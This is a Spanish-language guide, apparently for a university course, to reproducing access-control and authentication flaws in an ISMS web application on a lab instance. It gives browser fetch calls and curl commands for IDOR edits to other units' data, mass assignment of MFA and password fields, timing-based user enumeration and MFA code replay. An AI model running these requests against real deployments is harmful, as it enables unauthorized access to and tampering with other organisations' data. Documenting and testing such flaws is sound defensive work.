# Cómo reproducir cada hallazgo como usuario común

Esta guía describe los pasos para **verificar** cada hallazgo confirmado, desde la perspectiva
de un usuario con permisos bajos (rol `DUENO_UNIDAD` o `LECTOR`), sin acceso a la base de datos
ni al servidor. Es material de reproducción para la cátedra y para el grupo autor; todo se
probó contra una instancia de laboratorio con datos sintéticos.

## Método base: consola del navegador

La cookie de sesión es `__Host-rsi_session`, marcada `HttpOnly`, así que **no** se puede leer
desde JavaScript. No hace falta: el navegador la adjunta sola en cada pedido al mismo origen.
Por eso la forma más fiel de reproducir, como "usuario común", es:

1. Iniciar sesión normalmente en la aplicación con la cuenta de rol bajo (p. ej. la de
   `DUENO_UNIDAD`).
2. Abrir las herramientas de desarrollo del navegador (F12) → pestaña **Console**.
3. Ejecutar pedidos con `fetch(...)` usando `credentials: 'include'`. El navegador agrega la
   cookie de sesión automáticamente, y como el pedido sale del propio origen de la app, también
   satisface la validación de `Origin` que hace el backend.

Helper que se usa en los ejemplos (pegar una vez en la consola):

```js
const API = location.origin + '/api/v1';
async function api(metodo, ruta, cuerpo) {
  const r = await fetch(API + ruta, {
    method: metodo,
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: cuerpo ? JSON.stringify(cuerpo) : undefined,
  });
  const texto = await r.text();
  console.log(metodo, ruta, '→', r.status);
  try { console.log(JSON.parse(texto)); } catch { console.log(texto); }
  return r.status;
}
```

Para los ejemplos hace falta conocer algunos IDs (de unidades, activos, etc.) que no son de la
unidad propia del usuario. Un `DUENO_UNIDAD`/`LECTOR` los obtiene de forma legítima navegando
la app (los endpoints de lectura de organización/unidades no filtran por alcance — ver
Hallazgo 1), o simplemente mirando las respuestas en la pestaña **Network**.

---

## Hallazgo 1 — Edición de unidades/organización fuera del alcance propio

**Rol necesario:** `DUENO_UNIDAD`.

**Pasos (consola):**

```js
// 1. Leer una unidad que NO es la propia (debería estar prohibido, pero responde 200)
await api('GET', '/organizaciones/unidades/<ID_UNIDAD_AJENA>');

// 2. Renombrar esa unidad ajena
await api('PATCH', '/organizaciones/unidades/<ID_UNIDAD_AJENA>', { nombre: 'prueba-acceso' });

// 3. Modificar el alcance SGSI de toda la organización
await api('PATCH', '/organizaciones/<ID_ORGANIZACION>', { alcanceSgsi: 'prueba-acceso' });
```

**Resultado vulnerable:** los tres pedidos responden `200`/`201` y el cambio queda guardado.
**Resultado esperado si estuviera corregido:** `403 Forbidden` en los pasos 1–3, porque el
usuario solo administra su propia unidad.

> Al terminar, dejar los valores originales (volver a hacer `PATCH` con el nombre/alcance
> previo) para no ensuciar los datos.

---

## Hallazgo 2 — Crear riesgos/incidentes sobre activos de otra unidad (IDOR)

**Rol necesario:** `DUENO_UNIDAD`.

**Pasos (consola):**

```js
// activoAjeno = ID de un activo que NO pertenece a la unidad del usuario
await api('POST', '/seguridad/riesgos', {
  activoId: '<ID_ACTIVO_AJENO>', nombre: 'prueba', probabilidad: 3, impacto: 3, estado: 'IDENTIFICADO'
});
await api('POST', '/seguridad/incidentes', {
  activoId: '<ID_ACTIVO_AJENO>', titulo: 'prueba', severidad: 'ALTA'
});
```

**Resultado vulnerable:** responde `201`; se crea el registro asociado a un activo de otra
unidad (incluso uno que el usuario no ve en su propio listado de activos).
**Resultado esperado si estuviera corregido:** `403`, validando que `activoId` pertenezca a una
unidad dentro del alcance del usuario (como sí hace el `DELETE`, que queda en `403`).

> Para limpiar, pedirle a un administrador que borre los registros de prueba (el `DELETE`
> propio da 403, justamente por el hallazgo).

---

## Hallazgo 2c — Editar/borrar hitos de un plan de otra organización

**Rol necesario:** `DUENO_UNIDAD`.

**Pasos (consola):**

```js
// hitoAjeno = ID de un hito perteneciente a un plan de otra organización/unidad
await api('PATCH', '/cumplimiento/hitos/<ID_HITO_AJENO>', { nombre: 'prueba-acceso' });
await api('DELETE', '/cumplimiento/hitos/<ID_HITO_AJENO>');
```

**Resultado vulnerable:** ambos responden `200`. Nota: crear o listar hitos por la ruta
`/cumplimiento/planes/<id>/hitos` sí da `403` — la falla está solo en las rutas `/hitos/:id`
directas (editar y borrar).
**Resultado esperado si estuviera corregido:** `403` también en `PATCH`/`DELETE` de hitos.

---

## Hallazgo 2d — Rol RSI accede a datos de otra organización (URCDP)

**Rol necesario:** `RSI`.

**Contexto:** aplica solo si el despliegue aloja **más de una** organización. El rol `RSI` no
tiene ningún filtro de alcance, así que puede operar sobre cualquier organización del sistema.

**Pasos (consola):**

```js
// orgAjena = ID de una organización que NO es la del RSI
await api('GET', '/exportaciones/organizaciones/<ID_ORG_AJENA>/urcdp');   // lee bases de datos personales ajenas
```

**Resultado vulnerable:** `200` con el contenido completo de las bases de datos personales
(registro URCDP) de la otra organización; también se pueden modificar con `PUT` sobre
`/exportaciones/organizaciones/<ID_ORG_AJENA>/urcdp/bases-personales/<fichaId>`.
**Resultado esperado si estuviera corregido:** `403`, limitando a cada RSI a su propia
organización. (Este punto depende de la intención de diseño — ver la pregunta abierta en el
informe de hallazgos.)

---

## Hallazgo 3 — Un administrador puede escribir campos protegidos de cualquier usuario

**Rol necesario:** `ADMINISTRADOR` (no es "usuario común", pero se incluye por completitud; es
el hallazgo de mayor impacto).

> Nota: las cuentas `ADMINISTRADOR` y `RSI` tienen MFA obligatorio, así que para loguearte por
> API/consola necesitás incluir el campo `codigoMfa` con el código TOTP vigente. Desde la UI,
> simplemente completás el segundo factor como siempre.

**Pasos (consola):**

```js
// Escribir campos que el formulario legítimo nunca envía
await api('PATCH', '/auth/usuarios/<ID_USUARIO>', { mfaConfirmado: true });
```

**Resultado vulnerable:** `200`. El backend persiste campos como `mfaConfirmado`, `mfaSecret`
o `passwordHash` que no están en el DTO de actualización, porque el body se pasa crudo a la
base. La respuesta no muestra esos campos (quedan ocultos por el `select`), pero el cambio se
guarda. En el laboratorio esto se comprobó consultando la base directamente.
**Resultado esperado si estuviera corregido:** el backend ignora o rechaza todo campo fuera del
DTO (`ValidationPipe` con `whitelist`/`forbidNonWhitelisted`), por lo que esos campos no se
tocan.

---

## Hallazgo 4 — Enumeración de usuarios por tiempo de respuesta

**Rol necesario:** ninguno (se prueba sin autenticarse, en `/auth/login`).

**Pasos:** medir el tiempo de respuesta de dos logins fallidos, uno con un correo que existe y
otro con uno que no. Desde una terminal:

```bash
# Usuario que existe (contraseña incorrecta)
curl -k -s -o /dev/null -w "%{time_total}\n" -X POST https://<HOST>/api/v1/auth/login \
  -H 'Content-Type: application/json' -H 'Origin: https://<HOST>' \
  -d '{"correo":"<CORREO_EXISTENTE>","password":"x"}'

# Usuario que no existe
curl -k -s -o /dev/null -w "%{time_total}\n" -X POST https://<HOST>/api/v1/auth/login \
  -H 'Content-Type: application/json' -H 'Origin: https://<HOST>' \
  -d '{"correo":"noexiste@ejemplo.com","password":"x"}'
```

**Resultado vulnerable:** el correo que existe tarda ~0.5 s (el backend verifica el hash);
el que no existe, ~0.02 s. La diferencia revela qué correos están registrados.
**Nota:** nginx limita a 5 intentos/minuto por IP, así que conviene esperar entre pruebas (si
no, se recibe `429`). Esto hace la enumeración lenta, no imposible.
**Resultado esperado si estuviera corregido:** ambos casos deben tardar lo mismo (ejecutar un
hash "señuelo" cuando el usuario no existe).

---

## Hallazgo 4b — Reutilización (replay) de un código MFA

**Rol necesario:** una cuenta con MFA activado.

**Pasos:** en el momento de iniciar sesión, usar el mismo código de 6 dígitos de la app de
autenticación **dos veces seguidas** (dos logins en el mismo intervalo de ~30 s). Se puede
hacer con dos envíos del formulario de login, o repitiendo el `POST /auth/login` con el mismo
`codigoMfa`.

**Resultado vulnerable:** ambos logins tienen éxito (`201`) y se crean dos sesiones válidas.
**Resultado esperado si estuviera corregido:** el segundo uso del mismo código debe
rechazarse (registrar el último código/intervalo ya consumido por usuario).

---

## Hallazgo 9 — Listar todas las organizaciones del sistema

**Rol necesario:** `DUENO_UNIDAD` o `LECTOR`.

```js
await api('GET', '/organizaciones');
```

**Resultado vulnerable:** devuelve **todas** las organizaciones del sistema (no solo la propia),
con su nombre, alcance SGSI y perfil. Relevante solo si el despliegue aloja más de una
organización.
**Resultado esperado si estuviera corregido:** el listado debería limitarse a la organización
del usuario.

---

## Hallazgo 10 — Crear un proceso "huérfano" sin organización

**Rol necesario:** `DUENO_UNIDAD`.

```js
// Omitir organizacionId a propósito
await api('POST', '/organizaciones/procesos', { nombre: 'proceso-sin-organizacion' });
```

**Resultado vulnerable:** responde `201` y crea un proceso con `organizacionId: null`, fuera de
toda organización. (Enviar un `organizacionId` ajeno sí da `403` — el agujero es **omitirlo**.)
**Resultado esperado si estuviera corregido:** `400`/`403`, exigiendo una organización dentro
del alcance del usuario.

> Para limpiar, borrar el proceso creado (un admin puede: `DELETE /organizaciones/procesos/<id>`).

---

## Hallazgo 11 — Auto-aprobar/aceptar un riesgo propio

**Rol necesario:** `DUENO_UNIDAD`.

```js
// riesgoPropio = un riesgo de la unidad del usuario
await api('PATCH', '/seguridad/riesgos/<ID_RIESGO_PROPIO>', { estado: 'APROBADA', aceptado: true });
```

**Resultado vulnerable:** responde `200`; el riesgo queda en estado `APROBADA` y `aceptado:true`
sin pasar por ningún rol de aprobación (p. ej. `RSI`). Además el campo `estado` admite cualquier
texto. Verificable con un `GET` posterior del mismo riesgo.
**Resultado esperado si estuviera corregido:** la aprobación/aceptación debería requerir el rol
correspondiente, y `estado` debería validarse contra un conjunto cerrado de valores. (Sujeto a
confirmar cuál es el flujo de aprobación previsto por el grupo.)

---

## Comprobaciones negativas (controles que SÍ funcionan)

Para dejar constancia de que no todo está roto, estas pruebas deben **fallar** (y fallan):

```js
// Un LECTOR no puede escribir nada (ReadOnlyGuard) → 403
await api('PATCH', '/organizaciones/unidades/<ID>', { nombre: 'x' });

// Un DUENO_UNIDAD no puede auto-promoverse de rol (RolesGuard) → 403
await api('PATCH', '/auth/usuarios/<ID_PROPIO>', { rol: 'ADMINISTRADOR' });
```

Ambos responden `403`, lo que confirma que la escritura de solo-lectura y la escalada vertical
de rol están correctamente bloqueadas; el problema es específicamente el **alcance horizontal**
entre unidades/organizaciones y el mass assignment en la actualización de usuarios.
